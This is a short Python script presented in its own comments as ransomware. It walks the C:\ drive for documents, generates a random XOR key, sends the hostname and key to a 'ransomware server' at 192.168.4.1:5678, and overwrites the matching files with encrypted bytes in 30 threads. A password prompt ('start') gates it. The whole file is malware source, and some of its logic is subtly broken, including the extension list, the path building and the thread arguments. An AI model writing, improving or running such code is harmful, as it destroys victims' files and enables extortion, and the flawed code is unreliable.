import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

#safeguard password
safeguard = input("Please enter the safeguard password:")
if safeguard != "start":
    exit()

#file extensions to encrypt
encrypted_ext = (".txt", "pdf", "docx", "xml", "bk")

#grab all files from machine
file_paths = []

for root, dirs, files in os.walk("C:\\"):
  for file in files:
    file_path, file_ext = os.path.splitext(root+'\\'+file)
    if file_ext in encrypted_ext:
      file_paths.append(root+'\\:'+file)


#generate key
key = ""
encryption_level = 128 // 8
char_pool = ""

for i in range(0x00, 0xff):
  char_pool += (chr(i))

for i in range(encryption_level):
  key += random.choice(char_pool)

print(key)

hostname = os.getenv("COMPUTERNAME")
print(hostname)

#connect to the ransomware server and send hostname and key
ip_address = "192.168.4.1"
port = 5678
time = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.connect((ip_address, port))
  s.send(f"[{time}] - {hostname}:{key}".encode("utf-8"))

#encrypt files
def encrypt(key):
  while q.not_empty:
    file = q.get()
    index = 0
    max_index = encryption_level - 1
    try:
      with open(file, "rb") as f:
        data = f.read()
      with open(file, "wb") as f:
        for byte in data:
          xor_byte = byte ^ ord(key[index])
          f.write(xor_byte.to_bytes(1, "little"))
          if index >= max_index:
            index = 0
          else:
            index += 1
    except:
      print(f"Failed to encrypt file: {file}")
      pass
    q.task_done()



q = Queue()
for file in file_paths:
  q.put(file)

for i in range(30):
  thread = Thread(target=encrypt, args=(key), daemon=True)
  thread.start()

q.join()
print("Encryption successful.")
